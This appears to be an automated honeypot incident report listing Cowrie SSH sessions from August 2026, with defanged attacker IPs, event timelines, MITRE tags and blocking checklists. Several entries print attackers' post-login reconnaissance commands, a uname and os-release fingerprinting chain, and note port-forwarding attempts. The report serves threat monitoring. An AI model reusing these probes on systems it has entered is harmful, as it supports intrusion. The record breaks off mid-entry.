### 🔴 HIGH · IR-3223c0ce43da

| Field | Detail |
|---|---|
| **Source IP** | `112.27.129[.]78` |
| **First Seen** | 2026-08-08 04:16 |
| **Last Seen** | 2026-08-08 04:16 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:16:46` | `cowrie.session.connect` |
| `2026-08-08 04:16:46` | `cowrie.client.version` |
| `2026-08-08 04:16:46` | `cowrie.client.kex` |
| `2026-08-08 04:16:50` | `cowrie.login.success` |
| `2026-08-08 04:16:50` | `cowrie.direct-tcpip.request` |
| `2026-08-08 04:16:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.27.129[.]78` to AbuseIPDB if not already reported
- [ ] Block `112.27.129[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6863d531c93e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:18 |
| **Last Seen** | 2026-08-08 04:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:18:01` | `cowrie.session.connect` |
| `2026-08-08 04:18:01` | `cowrie.client.version` |
| `2026-08-08 04:18:01` | `cowrie.client.kex` |
| `2026-08-08 04:18:03` | `cowrie.login.success` |
| `2026-08-08 04:18:05` | `cowrie.session.params` |
| `2026-08-08 04:18:05` | `cowrie.command.input` |
| `2026-08-08 04:18:05` | `cowrie.command.input` |
| `2026-08-08 04:18:05` | `cowrie.command.input` |
| `2026-08-08 04:18:05` | `cowrie.command.input` |
| `2026-08-08 04:18:05` | `cowrie.command.input` |
| `2026-08-08 04:18:05` | `cowrie.command.success` |
| `2026-08-08 04:18:05` | `cowrie.command.input` |
| `2026-08-08 04:18:05` | `cowrie.command.input` |
| `2026-08-08 04:18:05` | `cowrie.command.input` |
| `2026-08-08 04:18:05` | `cowrie.command.input` |
| `2026-08-08 04:18:05` | `cowrie.log.closed` |
| `2026-08-08 04:18:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecec420e127b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:18 |
| **Last Seen** | 2026-08-08 04:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:18:12` | `cowrie.session.connect` |
| `2026-08-08 04:18:12` | `cowrie.client.version` |
| `2026-08-08 04:18:12` | `cowrie.client.kex` |
| `2026-08-08 04:18:12` | `cowrie.login.success` |
| `2026-08-08 04:18:13` | `cowrie.session.params` |
| `2026-08-08 04:18:13` | `cowrie.command.input` |
| `2026-08-08 04:18:13` | `cowrie.log.closed` |
| `2026-08-08 04:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9457d439c017

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:19 |
| **Last Seen** | 2026-08-08 04:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:19:50` | `cowrie.session.connect` |
| `2026-08-08 04:19:50` | `cowrie.client.version` |
| `2026-08-08 04:19:50` | `cowrie.client.kex` |
| `2026-08-08 04:19:53` | `cowrie.login.success` |
| `2026-08-08 04:19:54` | `cowrie.session.params` |
| `2026-08-08 04:19:54` | `cowrie.command.input` |
| `2026-08-08 04:19:54` | `cowrie.command.input` |
| `2026-08-08 04:19:54` | `cowrie.command.input` |
| `2026-08-08 04:19:54` | `cowrie.command.input` |
| `2026-08-08 04:19:54` | `cowrie.command.input` |
| `2026-08-08 04:19:54` | `cowrie.command.success` |
| `2026-08-08 04:19:54` | `cowrie.command.input` |
| `2026-08-08 04:19:54` | `cowrie.command.input` |
| `2026-08-08 04:19:54` | `cowrie.command.input` |
| `2026-08-08 04:19:54` | `cowrie.command.input` |
| `2026-08-08 04:19:54` | `cowrie.log.closed` |
| `2026-08-08 04:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7913aa9bb5ea

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:21 |
| **Last Seen** | 2026-08-08 04:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:21:44` | `cowrie.session.connect` |
| `2026-08-08 04:21:44` | `cowrie.client.version` |
| `2026-08-08 04:21:44` | `cowrie.client.kex` |
| `2026-08-08 04:21:46` | `cowrie.login.success` |
| `2026-08-08 04:21:47` | `cowrie.session.params` |
| `2026-08-08 04:21:47` | `cowrie.command.input` |
| `2026-08-08 04:21:47` | `cowrie.command.input` |
| `2026-08-08 04:21:47` | `cowrie.command.input` |
| `2026-08-08 04:21:47` | `cowrie.command.input` |
| `2026-08-08 04:21:47` | `cowrie.command.input` |
| `2026-08-08 04:21:47` | `cowrie.command.success` |
| `2026-08-08 04:21:47` | `cowrie.command.input` |
| `2026-08-08 04:21:47` | `cowrie.command.input` |
| `2026-08-08 04:21:47` | `cowrie.command.input` |
| `2026-08-08 04:21:47` | `cowrie.command.input` |
| `2026-08-08 04:21:48` | `cowrie.log.closed` |
| `2026-08-08 04:21:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1acc76b96ee

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:23 |
| **Last Seen** | 2026-08-08 04:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:23:38` | `cowrie.session.connect` |
| `2026-08-08 04:23:38` | `cowrie.client.version` |
| `2026-08-08 04:23:38` | `cowrie.client.kex` |
| `2026-08-08 04:23:40` | `cowrie.login.success` |
| `2026-08-08 04:23:42` | `cowrie.session.params` |
| `2026-08-08 04:23:42` | `cowrie.command.input` |
| `2026-08-08 04:23:42` | `cowrie.command.input` |
| `2026-08-08 04:23:42` | `cowrie.command.input` |
| `2026-08-08 04:23:42` | `cowrie.command.input` |
| `2026-08-08 04:23:42` | `cowrie.command.input` |
| `2026-08-08 04:23:42` | `cowrie.command.success` |
| `2026-08-08 04:23:42` | `cowrie.command.input` |
| `2026-08-08 04:23:42` | `cowrie.command.input` |
| `2026-08-08 04:23:42` | `cowrie.command.input` |
| `2026-08-08 04:23:42` | `cowrie.command.input` |
| `2026-08-08 04:23:42` | `cowrie.log.closed` |
| `2026-08-08 04:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4b5610742b5

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:23 |
| **Last Seen** | 2026-08-08 04:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:23:38` | `cowrie.session.connect` |
| `2026-08-08 04:23:38` | `cowrie.client.version` |
| `2026-08-08 04:23:38` | `cowrie.client.kex` |
| `2026-08-08 04:23:38` | `cowrie.login.success` |
| `2026-08-08 04:23:39` | `cowrie.session.params` |
| `2026-08-08 04:23:39` | `cowrie.command.input` |
| `2026-08-08 04:23:39` | `cowrie.log.closed` |
| `2026-08-08 04:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb5d84ce3913

| Field | Detail |
|---|---|
| **Source IP** | `223.99.212[.]58` |
| **First Seen** | 2026-08-08 04:23 |
| **Last Seen** | 2026-08-08 04:24 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:23:50` | `cowrie.session.connect` |
| `2026-08-08 04:23:51` | `cowrie.client.version` |
| `2026-08-08 04:23:51` | `cowrie.client.kex` |
| `2026-08-08 04:23:54` | `cowrie.login.success` |
| `2026-08-08 04:23:55` | `cowrie.direct-tcpip.request` |
| `2026-08-08 04:24:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.99.212[.]58` to AbuseIPDB if not already reported
- [ ] Block `223.99.212[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f976a46741c

| Field | Detail |
|---|---|
| **Source IP** | `71.229.1[.]186` |
| **First Seen** | 2026-08-08 04:24 |
| **Last Seen** | 2026-08-08 04:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:24:00` | `cowrie.session.connect` |
| `2026-08-08 04:24:01` | `cowrie.client.version` |
| `2026-08-08 04:24:01` | `cowrie.client.kex` |
| `2026-08-08 04:24:02` | `cowrie.login.success` |
| `2026-08-08 04:24:02` | `cowrie.direct-tcpip.request` |
| `2026-08-08 04:24:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.229.1[.]186` to AbuseIPDB if not already reported
- [ ] Block `71.229.1[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc2fe09f43fd

| Field | Detail |
|---|---|
| **Source IP** | `213.33.204[.]130` |
| **First Seen** | 2026-08-08 04:25 |
| **Last Seen** | 2026-08-08 04:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:25:21` | `cowrie.session.connect` |
| `2026-08-08 04:25:21` | `cowrie.client.version` |
| `2026-08-08 04:25:21` | `cowrie.client.kex` |
| `2026-08-08 04:25:23` | `cowrie.login.success` |
| `2026-08-08 04:25:23` | `cowrie.direct-tcpip.request` |
| `2026-08-08 04:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.33.204[.]130` to AbuseIPDB if not already reported
- [ ] Block `213.33.204[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-730a360be609

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:25 |
| **Last Seen** | 2026-08-08 04:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:25:32` | `cowrie.session.connect` |
| `2026-08-08 04:25:32` | `cowrie.client.version` |
| `2026-08-08 04:25:32` | `cowrie.client.kex` |
| `2026-08-08 04:25:33` | `cowrie.login.success` |
| `2026-08-08 04:25:35` | `cowrie.session.params` |
| `2026-08-08 04:25:35` | `cowrie.command.input` |
| `2026-08-08 04:25:35` | `cowrie.command.input` |
| `2026-08-08 04:25:35` | `cowrie.command.input` |
| `2026-08-08 04:25:35` | `cowrie.command.input` |
| `2026-08-08 04:25:35` | `cowrie.command.input` |
| `2026-08-08 04:25:35` | `cowrie.command.success` |
| `2026-08-08 04:25:35` | `cowrie.command.input` |
| `2026-08-08 04:25:35` | `cowrie.command.input` |
| `2026-08-08 04:25:35` | `cowrie.command.input` |
| `2026-08-08 04:25:35` | `cowrie.command.input` |
| `2026-08-08 04:25:35` | `cowrie.log.closed` |
| `2026-08-08 04:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99169deb16f2

| Field | Detail |
|---|---|
| **Source IP** | `62.220.104[.]155` |
| **First Seen** | 2026-08-08 04:25 |
| **Last Seen** | 2026-08-08 04:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:25:33` | `cowrie.session.connect` |
| `2026-08-08 04:25:34` | `cowrie.client.version` |
| `2026-08-08 04:25:34` | `cowrie.client.kex` |
| `2026-08-08 04:25:36` | `cowrie.login.success` |
| `2026-08-08 04:25:36` | `cowrie.direct-tcpip.request` |
| `2026-08-08 04:25:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.220.104[.]155` to AbuseIPDB if not already reported
- [ ] Block `62.220.104[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-192539a69efa

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:25 |
| **Last Seen** | 2026-08-08 04:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:25:33` | `cowrie.session.connect` |
| `2026-08-08 04:25:33` | `cowrie.client.version` |
| `2026-08-08 04:25:33` | `cowrie.client.kex` |
| `2026-08-08 04:25:34` | `cowrie.login.success` |
| `2026-08-08 04:25:34` | `cowrie.session.params` |
| `2026-08-08 04:25:34` | `cowrie.command.input` |
| `2026-08-08 04:25:35` | `cowrie.log.closed` |
| `2026-08-08 04:25:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af08c2a33046

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:27 |
| **Last Seen** | 2026-08-08 04:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:27:26` | `cowrie.session.connect` |
| `2026-08-08 04:27:27` | `cowrie.client.version` |
| `2026-08-08 04:27:27` | `cowrie.client.kex` |
| `2026-08-08 04:27:29` | `cowrie.login.success` |
| `2026-08-08 04:27:31` | `cowrie.session.params` |
| `2026-08-08 04:27:31` | `cowrie.command.input` |
| `2026-08-08 04:27:31` | `cowrie.command.input` |
| `2026-08-08 04:27:31` | `cowrie.command.input` |
| `2026-08-08 04:27:31` | `cowrie.command.input` |
| `2026-08-08 04:27:31` | `cowrie.command.input` |
| `2026-08-08 04:27:31` | `cowrie.command.success` |
| `2026-08-08 04:27:31` | `cowrie.command.input` |
| `2026-08-08 04:27:31` | `cowrie.command.input` |
| `2026-08-08 04:27:31` | `cowrie.command.input` |
| `2026-08-08 04:27:31` | `cowrie.command.input` |
| `2026-08-08 04:27:31` | `cowrie.log.closed` |
| `2026-08-08 04:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5db622f4c7e6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:27 |
| **Last Seen** | 2026-08-08 04:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:27:28` | `cowrie.session.connect` |
| `2026-08-08 04:27:28` | `cowrie.client.version` |
| `2026-08-08 04:27:28` | `cowrie.client.kex` |
| `2026-08-08 04:27:29` | `cowrie.login.success` |
| `2026-08-08 04:27:30` | `cowrie.session.params` |
| `2026-08-08 04:27:30` | `cowrie.command.input` |
| `2026-08-08 04:27:30` | `cowrie.log.closed` |
| `2026-08-08 04:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee3a6f3ec5a0

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:29 |
| **Last Seen** | 2026-08-08 04:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:29:18` | `cowrie.session.connect` |
| `2026-08-08 04:29:18` | `cowrie.client.version` |
| `2026-08-08 04:29:18` | `cowrie.client.kex` |
| `2026-08-08 04:29:19` | `cowrie.login.success` |
| `2026-08-08 04:29:20` | `cowrie.session.params` |
| `2026-08-08 04:29:20` | `cowrie.command.input` |
| `2026-08-08 04:29:20` | `cowrie.log.closed` |
| `2026-08-08 04:29:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f03c1c22d3dd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:29 |
| **Last Seen** | 2026-08-08 04:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:29:23` | `cowrie.session.connect` |
| `2026-08-08 04:29:23` | `cowrie.client.version` |
| `2026-08-08 04:29:23` | `cowrie.client.kex` |
| `2026-08-08 04:29:25` | `cowrie.login.success` |
| `2026-08-08 04:29:26` | `cowrie.session.params` |
| `2026-08-08 04:29:26` | `cowrie.command.input` |
| `2026-08-08 04:29:26` | `cowrie.command.input` |
| `2026-08-08 04:29:26` | `cowrie.command.input` |
| `2026-08-08 04:29:26` | `cowrie.command.input` |
| `2026-08-08 04:29:26` | `cowrie.command.input` |
| `2026-08-08 04:29:26` | `cowrie.command.success` |
| `2026-08-08 04:29:26` | `cowrie.command.input` |
| `2026-08-08 04:29:26` | `cowrie.command.input` |
| `2026-08-08 04:29:26` | `cowrie.command.input` |
| `2026-08-08 04:29:26` | `cowrie.command.input` |
| `2026-08-08 04:29:27` | `cowrie.log.closed` |
| `2026-08-08 04:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02cbc6a5a961

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:31 |
| **Last Seen** | 2026-08-08 04:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:31:10` | `cowrie.session.connect` |
| `2026-08-08 04:31:10` | `cowrie.client.version` |
| `2026-08-08 04:31:10` | `cowrie.client.kex` |
| `2026-08-08 04:31:11` | `cowrie.login.success` |
| `2026-08-08 04:31:11` | `cowrie.session.params` |
| `2026-08-08 04:31:11` | `cowrie.command.input` |
| `2026-08-08 04:31:11` | `cowrie.log.closed` |
